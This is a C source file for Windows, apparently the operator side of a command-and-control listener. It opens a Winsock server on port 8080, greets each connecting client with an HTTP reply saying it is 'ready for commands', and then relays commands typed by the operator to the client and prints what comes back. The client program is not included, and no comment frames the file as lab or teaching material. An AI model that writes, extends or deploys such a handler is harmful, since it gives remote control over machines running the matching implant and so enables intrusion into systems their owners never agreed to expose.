#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32.lib")

#define OUTPUT_BUFFER_SIZE 8192  

void send_http_response(int client_fd, int status_code, const char* content_type, const char* body) {
    char response[1024];
    const char* status_line;

    switch (status_code) {
    case 200:
        status_line = "HTTP/1.1 200 OK\r\n";
        break;
    case 404:
        status_line = "HTTP/1.1 404 Not Found\r\n";
        break;
    case 500:
        status_line = "HTTP/1.1 500 Internal Server Error\r\n";
        break;
    default:
        status_line = "HTTP/1.1 500 Internal Server Error\r\n";
        break;
    }

    snprintf(response, sizeof(response),
        "%s"
        "Content-Type: %s\r\n"
        "Content-Length: %zu\r\n"
        "Connection: close\r\n"
        "\r\n"
        "%s",
        status_line, content_type, strlen(body), body);

    send(client_fd, response, strlen(response), 0);
}

int InitialiseSocket() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        perror("WSAStartup failed");
        return EXIT_FAILURE;
    }

    SOCKET serverfd;
    struct sockaddr_in serverAddr;

    serverfd = socket(AF_INET, SOCK_STREAM, 0);
    if (serverfd == INVALID_SOCKET) {
        perror("Socket failed to initialise");
        WSACleanup();
        return EXIT_FAILURE;
    }

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(8080);

    if (bind(serverfd, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        perror("Failed to bind");
        closesocket(serverfd);
        WSACleanup();
        return EXIT_FAILURE;
    }

    if (listen(serverfd, 10) == SOCKET_ERROR) {
        perror("Socket failed to listen");
        closesocket(serverfd);
        WSACleanup();
        return EXIT_FAILURE;
    }

    return serverfd;
}

DWORD WINAPI handle_client(LPVOID client_fd_ptr) {
    SOCKET client_fd = *(SOCKET*)client_fd_ptr;
    free(client_fd_ptr);

    char buffer[1024];
    int received;

    // Wait for a request from the client
    received = recv(client_fd, buffer, sizeof(buffer) - 1, 0);
    if (received <= 0) {
        printf("Failed to receive data from client.\n");
        closesocket(client_fd);
        return 0;
    }

    buffer[received] = '\0'; // Null terminate the received data
    printf("Received request: %s\n", buffer);

    // Assuming it is a GET request
    if (strstr(buffer, "GET")) {
        printf("Client is ready for commands.\n");

        // Sending a response back to the client
        const char* response_message = "Client connected and ready for commands.\n";
        send_http_response(client_fd, 200, "text/plain", response_message);
    }

    // Loop to send commands to the client
    while (1) {
        char command[256];
        printf("Enter command to send to client (or 'exit' to quit): ");
        fgets(command, sizeof(command), stdin);

        // Remove newline character if present
        size_t len = strlen(command);
        if (len > 0 && command[len - 1] == '\n') {
            command[len - 1] = '\0';
        }

        if (strcmp(command, "exit") == 0) {
            break; // Exit the loop
        }

        // Send the command to the client
        send(client_fd, command, strlen(command), 0);

        // Receive the response from the client
        char response[OUTPUT_BUFFER_SIZE];
        int bytes_received = recv(client_fd, response, sizeof(response) - 1, 0);
        if (bytes_received <= 0) {
            printf("Client disconnected.\n");
            break; // Exit the loop on client disconnect
        }

        response[bytes_received] = '\0'; // Null-terminate the received data
        printf("Response from client: %s", response); // Print without a newline

        // Removed the end message check
    }

    closesocket(client_fd); // Close the client socket after handling the request
    return 0;
}

void HandleConnections(int serverfd) {
    while (TRUE) {
        struct sockaddr_in clientAddr;
        int client_len = sizeof(clientAddr);

        SOCKET* client_fd = malloc(sizeof(SOCKET));
        *client_fd = accept(serverfd, (struct sockaddr*)&clientAddr, &client_len);
        if (*client_fd == INVALID_SOCKET) {
            perror("Failed to accept client connection");
            free(client_fd);
            continue;
        }

        printf("Client connected.\n");

        // Handle the client in a new thread
        CreateThread(NULL, 0, handle_client, client_fd, 0, NULL);
    }
}

int main() {
    int serverfd = InitialiseSocket();
    if (serverfd == EXIT_FAILURE) return EXIT_FAILURE;

    printf("Server is running...\n");
    HandleConnections(serverfd);

    closesocket(serverfd);
    WSACleanup();
    return 0;
}
